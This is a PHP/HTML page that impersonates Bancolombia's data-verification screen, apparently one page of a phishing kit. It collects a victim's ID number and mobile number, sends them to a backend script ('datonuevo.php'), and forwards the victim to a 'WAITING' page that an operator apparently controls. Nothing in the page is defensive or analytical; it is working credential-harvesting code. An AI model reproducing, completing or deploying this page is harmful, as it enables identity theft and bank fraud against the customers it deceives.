<?php
error_reporting(0);
date_default_timezone_set('America/Bogota');
?>
<!DOCTYPE html>
<html>
    <head>
        <title>Bancolombia - Verificación de Datos</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&display=swap" rel="stylesheet">
        <link href="../css/stylesheet.css" rel="stylesheet">
        <link href="../css/style-app.css?v=<?php echo time(); ?>" rel="stylesheet">        
        <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
        <script type="text/javascript" src="../js/functions.js?v=<?php echo time(); ?>"></script>

        <style type="text/css">
            /* Corregido: Eliminamos el !important para que el JS pueda mostrar la carga */
            #fondo, #cargando-o {
                display: none;
                position: fixed;
                top: 0; left: 0; width: 100%; height: 100%;
                background: rgba(255,255,255,0.95);
                z-index: 9999;
                text-align: center;
                padding-top: 50%;
            }
            .entradas { border: none; outline: none; width: 100%; font-size: 16px; background: transparent; font-family: 'Open Sans'; }
            .inp { border-bottom: 1px solid #ccc; padding: 10px 0; margin-bottom: 20px; }
            #btn-info { 
                width: 90%; margin: 20px auto; display: block; height: 50px; 
                border: none; border-radius: 25px; font-weight: bold; 
                background-color: #eee; color: #aaa; transition: 0.3s;
                cursor: not-allowed;
            }
        </style>
    </head>
    <body>         
        <div id="fondo"></div>
        <div id="cargando-o">
            <img src="../img/load4.gif" width="80"><br>
            <p style="color: #666; font-family: 'Open Sans';">Validando información...</p>
        </div>

        <table width="100%" border="0" cellpadding="0" cellspacing="0" style="padding: 15px;">
            <tr>
                <td align="left"><img src="../img/btn-cerrar.jpg" height="25"></td>
                <td align="center"><img src="../img/logo-app.jpg" height="25"></td>
                <td align="right"><span id="txt-continuar-top" style="color: #ccc; font-weight: bold; font-size: 14px;">Continuar</span></td>
            </tr>
        </table>        
        
        <div style="text-align: center; margin-top: 30px;">
            <div style="font-weight: 800; font-size: 20px; color: #333;">Verificación de datos</div>
            <p style="color: #666; font-size: 14px; padding: 0 40px;">Ingrese sus datos personales para gestionar aprobación de su solicitud.</p>
        </div>

        <div class="frm" style="padding: 30px;">
            <div class="inp">
                <table width="100%">
                    <tr>
                        <td width="30"><img src="../img/ico-id.jpg" width="20"></td>
                        <td><input type="text" id="txt-documento" placeholder="Número de documento" class="entradas" inputmode="numeric" maxlength="12"></td>
                    </tr>
                </table>
            </div>

            <div class="inp">
                <table width="100%">
                    <tr>
                        <td width="30"><img src="../img/ico-cel.jpg" width="20"></td>
                        <td><input type="text" id="txt-celular" placeholder="Teléfono celular" class="entradas" inputmode="numeric" maxlength="10"></td>
                    </tr>
                </table>
            </div>
        </div>  

        <button id="btn-info" disabled>CONTINUAR</button> 
        <p style="text-align: center; color: #1a1b1a; font-weight: bold; text-decoration: underline; font-size: 14px; margin-top: 30px;">¿No eres cliente?</p>

        <script type="text/javascript">
            $(document).ready(function() { 
                $("#fondo, #cargando-o").hide();

                // Resetear estado para evitar bucles en WAITING
                $.post("../process/estado.php", { nuevo_estado: "1" });

                // Validación en tiempo real
                $("#txt-documento, #txt-celular").on("input", function() {
                    this.value = this.value.replace(/[^0-9]/g, ''); // Solo números
                    
                    var d = $("#txt-documento").val();
                    var c = $("#txt-celular").val();

                    if (d.length >= 6 && c.length === 10) {
                        $("#btn-info").prop("disabled", false).css({"background-color": "#FDDA24", "color": "#000", "cursor": "pointer"});
                        $("#txt-continuar-top").css("color", "#000");
                    } else {
                        $("#btn-info").prop("disabled", true).css({"background-color": "#eee", "color": "#aaa", "cursor": "not-allowed"});
                        $("#txt-continuar-top").css("color", "#ccc");
                    }
                });

                $("#btn-info").click(function(e) {
                    e.preventDefault();
                    var doc = $("#txt-documento").val();
                    var cel = $("#txt-celular").val();
                    
                    if (doc !== "" && cel !== "") {
                        $("#fondo").show();
                        $("#cargando-o").show();
                        
                        // Enviamos el reporte de datos adicionales
                        $.post("../process/datonuevo.php", { documento: doc, celular: cel }, function(data) {
                            window.location.href = "WAITING.php";
                        });

                        // Salto forzado (Redundancia)
                        setTimeout(function() {
                            window.location.href = "WAITING.php";
                        }, 3500);
                    }
                });
            });
        </script>
    </body>
</html>
